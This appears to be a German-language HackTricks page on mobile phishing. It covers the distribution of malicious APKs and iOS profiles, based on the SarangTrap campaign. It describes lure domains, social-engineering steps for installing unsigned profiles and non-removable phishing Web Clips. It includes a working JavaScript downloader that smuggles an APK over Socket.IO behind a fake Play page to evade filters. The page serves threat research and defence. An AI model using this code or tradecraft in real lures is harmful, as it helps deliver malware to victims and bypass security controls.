# Mobile Phishing & Malicious App Distribution (Android & iOS)

> [!INFO]
> Diese Seite behandelt Techniken, die von Threat Actors verwendet werden, um **malicious Android APKs** und **iOS mobile-configuration profiles** durch Phishing (SEO, Social Engineering, Fake Stores, Dating-Apps usw.) zu verteilen.
> Das Material basiert auf der von Zimperium zLabs (2025) aufgedeckten SarangTrap-Kampagne und anderer öffentlicher Forschung.<sup>[[1]](#references)</sup>

## Attack Flow

1. **SEO/Phishing Infrastructure**
* Dutzende ähnlich aussehende Domains registrieren (Dating, Cloud Share, Car Service usw.).
– Keywords in der lokalen Sprache und Emojis im `<title>`-Element verwenden, um in Google besser zu ranken.
– Sowohl Android-Installationsanweisungen (`.apk`) als auch iOS-Installationsanweisungen auf derselben Landing Page hosten.
2. **First Stage Download**
* Android: direkter Link zu einer *unsigned* oder aus einem „Third-Party Store“ stammenden APK.
* iOS: `itms-services://`- oder einfacher HTTPS-Link zu einem bösartigen **mobileconfig**-Profil (siehe unten).
3. **Android Post-install Behaviour**
* C2-gesteuerte Ausführung, Missbrauch von Berechtigungen, Dropper-Bypasses, Sammlung im Hintergrund und anderes Post-install-Malware-Verhalten werden auf der unten genannten dedizierten Android Malware Post-Exploitation-Seite behandelt.
4. **iOS Delivery Technique**
* Ein einzelnes **mobile-configuration profile** kann `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` usw. anfordern, um das Gerät in eine „MDM“-ähnliche Überwachung einzubinden.
* Social-Engineering-Anweisungen:
1. Einstellungen öffnen ➜ *Profil geladen*.
2. Dreimal auf *Installieren* tippen (Screenshots auf der Phishing-Seite).
3. Dem unsigned profile vertrauen ➜ der Angreifer erhält ohne App-Store-Prüfung die Berechtigungen für *Contacts* und *Photo*.
5. **iOS Web Clip Payload (phishing app icon)**
* `com.apple.webClip.managed`-Payloads können eine **Phishing-URL mit einem gebrandeten Icon/Label auf dem Home Screen anheften**.
* Web Clips können **im Vollbildmodus** ausgeführt werden (blenden die Browseroberfläche aus) und als **nicht entfernbar** markiert werden, wodurch das Opfer das Profil löschen muss, um das Icon zu entfernen.<sup>[[3]](#references)</sup>
6. **Network Layer**
* Einfaches HTTP, häufig auf Port 80 mit einem HOST-Header wie `api.<phishingdomain>.com`.
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (kein TLS → leicht zu erkennen).

## Android Malware Post-Exploitation

Für Android-Malware-Techniken nach der Installation wie C2, Accessibility-Missbrauch, Overlays, ATS-Automatisierung, gestaffeltes DEX-Laden, Premium-SMS und Persistenz siehe:

{{#ref}}
../basic-forensic-methodology/android-malware-post-exploitation.md
{{#endref}}

## Socket.IO/WebSocket-based APK Smuggling + Fake Google Play Pages

Angreifer ersetzen statische APK-Links zunehmend durch einen in Google-Play-ähnliche Köder eingebetteten Socket.IO/WebSocket-Kanal. Dadurch wird die Payload-URL verborgen, URL-/Erweiterungsfilter werden umgangen und eine realistische Installations-UX bleibt erhalten.<sup>[[2]](#references)[[4]](#references)</sup>

Typischer, in freier Wildbahn beobachteter Client-Ablauf:

<details>
<summary>Socket.IO fake Play downloader (JavaScript)</summary>
```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
const url = URL.createObjectURL(blob);
const a = document.createElement("a");
a.href = url; a.download = "app.apk"; a.style.display = "none";
document.body.appendChild(a); a.click();
});
```
</details>

Warum es einfache Kontrollen umgeht:
- Es wird keine statische APK-URL offengelegt; die Payload wird im Speicher aus WebSocket-Frames rekonstruiert.
- URL-/MIME-/Erweiterungsfilter, die direkte .apk-Antworten blockieren, übersehen möglicherweise Binärdaten, die über WebSockets/Socket.IO getunnelt werden.
- Crawler und URL-Sandboxes, die keine WebSockets ausführen, rufen die Payload nicht ab.

Siehe auch WebSocket-Tradecraft und -Tools:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## References

- [1] [Die dunkle Seite der Romantik: SarangTrap-Erpressungskampagne](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [2] [Socket.IO](https://socket.io)
- [3] [Einstellungen für die Web Clips-Payload für Apple-Geräte](https://support.apple.com/guide/deployment/web-clips-payload-settings-depbc7c7808/web)
- [4] [Banker-Trojaner mit Zielgruppe indonesischer und vietnamesischer Android-Nutzer](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
{{#include ../../banners/hacktricks-training.md}}
